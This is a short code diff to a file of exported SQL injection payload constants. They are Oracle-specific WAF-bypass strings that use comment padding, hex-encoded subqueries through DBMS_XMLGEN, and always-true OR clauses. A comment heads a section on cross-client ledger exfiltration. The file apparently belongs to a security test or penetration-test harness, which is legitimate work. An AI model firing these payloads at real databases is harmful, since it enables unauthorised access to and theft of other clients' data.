@@ -12,7 +12,7 @@ export const ATTACK1_WAF_BYPASS_BOOLEAN = "'/**/OR/**/'1'='1";
  * Hex 73656c65… decodes to: select 'RES' from dual
  */
 export const ATTACK1_WAF_BYPASS_XML_HEX =
-  "'/**/OR/**/REGEXP_LIKE(DBMS_XMLGEN.GETXMLTYPE(utl_raw.cast_to_varchar2(HEXTORAW('73656c6563742027524553272066726f6d206475616c'))),'.') --";
+  "'/**/OR/**/REGEXP_LIKE(DBMS_XMLGEN.GETXMLTYPE(utl_raw.cast_to_varchar2(HEXTORAW('73656c6563742027524553272066726f6d206475616c'))),'.') OR '1'='1";
 
 /**
  * Attack Point 2 — cross-client ledger exfiltration.
